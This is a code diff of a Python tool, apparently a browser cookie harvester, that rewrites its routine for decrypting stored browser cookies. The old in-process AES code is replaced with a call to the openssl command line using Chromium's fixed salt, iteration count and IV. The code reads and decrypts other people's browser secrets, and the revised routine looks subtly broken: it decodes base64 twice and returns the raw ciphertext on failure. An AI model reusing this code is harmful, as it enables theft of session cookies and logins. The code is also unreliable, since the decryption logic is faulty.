@@ -16,7 +16,6 @@ import sqlite3
 import string
 import sys
 import tempfile
-from Crypto.Cipher import AES
 
 DEBUG = False
 
@@ -95,35 +94,40 @@ class Broswer:
                 self.cookies_path.append({browser_name: cookies_data})
 
     def decrypter(self, cipher_text, key):
+        # Print debug information
+        # print_debug(f"[+] decrypting {cipher_text} and  key is {key}")
+
         try:
-            # Удаляем первые 3 байта, которые могут быть префиксом
-            cipher_text = cipher_text[3:]
+            # Decode the base64 encoded cipher text
+            cipher_text_encoded = base64.b64decode(cipher_text[3:])
 
-            # Декодируем base64, если данные были закодированы
-            try:
-                cipher_text = base64.b64decode(cipher_text + b'=' * (-len(cipher_text) % 4))
-            except Exception as e:
-                print(f"[-] Base64 decoding error: {e}")
-                return None
+            # Correctly define the IV as a 16-byte value in hexadecimal
+            iv = '20202020202020202020202020202020'  # Adjust this according to your encryption setup
 
-            # Генерация ключа из пароля
-            key = hashlib.pbkdf2_hmac('sha1', key.encode('utf-8'), b'saltysalt', 1003)[:16]
+            # Derive the key using PBKDF2 HMAC SHA1
+            key = key.encode("utf-8")
+            derived_key = hashlib.pbkdf2_hmac('sha1', key, b'saltysalt', 1003)[:16]
+            hex_key = binascii.hexlify(derived_key).decode('utf-8')
 
-            # Инициализационный вектор (IV) длиной 16 байт
-            iv = b' ' * 16  # Используем пробелы (0x20) для IV
+            # Construct the OpenSSL command
+            cmd = [
+                "openssl", "enc", "-d", "-aes-128-cbc",
+                "-base64", "-iv", iv, "-K", hex_key
+            ]
 
-            # Создаем объект AES с использованием ключа и IV
-            cipher = AES.new(key, AES.MODE_CBC, iv)
+            # Use subprocess to execute the command
+            process = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output, error = process.communicate(input=cipher_text_encoded)
 
-            # Расшифровываем данные и удаляем паддинг PKCS#7
-            decrypted_data = cipher.decrypt(cipher_text)
-            padding_length = decrypted_data[-1]
-            decrypted_data = decrypted_data[:-padding_length]
+            if process.returncode != 0:
+                print(f"[-] Error running the openssl command: {error.decode('utf-8')}")
+                return cipher_text
 
-            return decrypted_data.decode('utf-8')
+            return output.strip()
+
         except Exception as e:
-            print(f"[-] Error decrypting data: {e}")
-            return None  # Возвращаем None в случае ошибки
+            print(f"[-] Exception occurred: {e}")
+            return cipher_text
 
               
     def browse_browser_db(self, browser_data_paths, query_type): 
